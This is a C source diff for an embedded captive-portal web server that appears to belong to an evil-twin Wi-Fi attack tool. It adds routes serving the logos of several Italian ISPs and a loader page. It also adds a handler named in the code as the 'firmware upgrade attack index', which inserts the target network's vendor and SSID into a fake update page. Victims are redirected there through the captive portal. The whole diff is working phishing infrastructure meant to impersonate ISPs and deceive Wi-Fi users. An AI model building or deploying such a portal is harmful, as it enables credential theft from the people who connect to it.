@@ -22,10 +22,14 @@
 
 #include "web/web_page.h"
 #include "web/web_net_manager.h"
-#include "web/bootstrap_min_css.h"
-#include "web/bootstrap_min_js.h"
-#include "web/jquery_min_js.h"
 
+#include "web/logo/vodafone.h"
+#include "web/logo/fastweb.h"
+#include "web/logo/skywifi.h"
+#include "web/logo/wind.h"
+#include "web/logo/tim.h"
+#include "web/logo/generic.h"
+#include "web/loader.h"
 #include "web/firmware_upgrade/index.h"
 
 #define CHUNK_SIZE 512
@@ -74,18 +78,84 @@ static void web_virtual_static_folder_manager(httpd_req_t *req)
 	/* bootstrap.min.css */
 	if( strcmp(req->uri, "/static/bootstrap.min.css") == 0 )
 	{
-		httpd_send_chunked_data(req, bootstrap_min_css, sizeof(bootstrap_min_css), "text/css");
+		//httpd_send_chunked_data(req, bootstrap_min_css, sizeof(bootstrap_min_css), "text/css");
 	}
 	/* bootstrap.min.js */
 	else if( strcmp(req->uri, "/static/bootstrap.min.js") == 0 )
 	{
-		httpd_send_chunked_data(req, bootstrap_min_js, sizeof(bootstrap_min_js), "application/javascript");
+		//httpd_send_chunked_data(req, bootstrap_min_js, sizeof(bootstrap_min_js), "application/javascript");
 	}
 	/* jquery.min.js */
 	else if( strcmp(req->uri, "/static/jquery.min.js") == 0 )
 	{
-		httpd_send_chunked_data(req, jquery_min_js, sizeof(jquery_min_js), "application/javascript");
+		//httpd_send_chunked_data(req, jquery_min_js, sizeof(jquery_min_js), "application/javascript");
 	}
+}
+
+
+/**
+ * @brief This function manage the file in the virtual folder /logo/
+ * 
+ * @param req 
+ */
+static void web_virtual_logo_folder_manager(httpd_req_t *req)
+{
+	/* Generic logo */
+	if( strcmp(req->uri, "/logo/Generic.png") == 0 )
+	{
+		httpd_send_chunked_data(req, generic_logo, sizeof(generic_logo), "image/png");
+	}
+	/* Vodafone logo */
+	else if( strcmp(req->uri, "/logo/Vodafone.png") == 0 )
+	{
+		httpd_send_chunked_data(req, vodafone_logo, sizeof(vodafone_logo), "image/png");
+	}
+	/* Fastweb logo */
+	else if( strcmp(req->uri, "/logo/Fastweb.png") == 0 )
+	{
+		httpd_send_chunked_data(req, fastweb_logo, sizeof(fastweb_logo), "image/png");
+	}
+	/* Skywifi logo */
+	else if( strcmp(req->uri, "/logo/Skywifi.png") == 0 )
+	{
+		httpd_send_chunked_data(req, skywifi_logo, sizeof(skywifi_logo), "image/png");
+	}
+	/* windtre logo */
+	else if( strcmp(req->uri, "/logo/Wind.png") == 0 )
+	{
+		httpd_send_chunked_data(req, wind_logo, sizeof(wind_logo), "image/png");
+	}
+	/* tim logo */
+	else if( strcmp(req->uri, "/logo/TIM.png") == 0 )
+	{
+		httpd_send_chunked_data(req, tim_logo, sizeof(tim_logo), "image/png");
+	}
+	/* Generic */
+	else
+	{
+		httpd_send_chunked_data(req, generic_logo, sizeof(generic_logo), "image/png");
+	}
+}
+
+
+/**
+ * @brief Manage the firmware upgrade attack index request
+ * 
+ * @param req 
+ */
+static void firmware_upgrade_index_manager(httpd_req_t *req)
+{
+	httpd_resp_set_hdr(req, "Connection", "keep-alive");
+	httpd_resp_set_type(req, "text/html");
+	httpd_resp_send_chunk(req, fu_index_header_html, sizeof(fu_index_header_html));
+
+	/* Fill data */
+	char script_data[150];
+	snprintf(script_data, sizeof(script_data), fu_index_script_html, vendorToString(target.vendor), (char *)&target.ssid, vendorToString(target.vendor));
+	httpd_resp_send_chunk(req, script_data, strlen(script_data));
+
+	httpd_resp_send_chunk(req, fu_index_body_html, sizeof(fu_index_body_html));
+	httpd_resp_send_chunk(req, NULL, 0);
 }
 
 
@@ -102,7 +172,7 @@ static void captive_portal_redirect(httpd_req_t *req)
 		switch(target.attack_scheme)
 		{
 			case FIRMWARE_UPGRADE:
-				httpd_send_chunked_data(req, fu_index_html, sizeof(fu_index_html), NULL);
+				firmware_upgrade_index_manager(req);
 				break;
 			
 			case WEB_NET_MANAGER:
@@ -119,10 +189,20 @@ static void captive_portal_redirect(httpd_req_t *req)
 		}
 		return;
 	}
+	/* loader.html same for all */
+	else if( strcmp(req->uri, "/loader.html") == 0 )
+	{
+		httpd_send_chunked_data(req, loader_html, sizeof(loader_html), NULL);
+	}
 	/* Static folder manager */
 	else if( strstr(req->uri, "/static/") != NULL )
 	{
 		web_virtual_static_folder_manager(req);
+	}
+	/* logo folder manager */
+	else if( strstr(req->uri, "/logo/") != NULL )
+	{
+		web_virtual_logo_folder_manager(req);
 	}
 	/* favicon.ico */
 	else if( strcmp(req->uri, "/favicon.ico") == 0 )
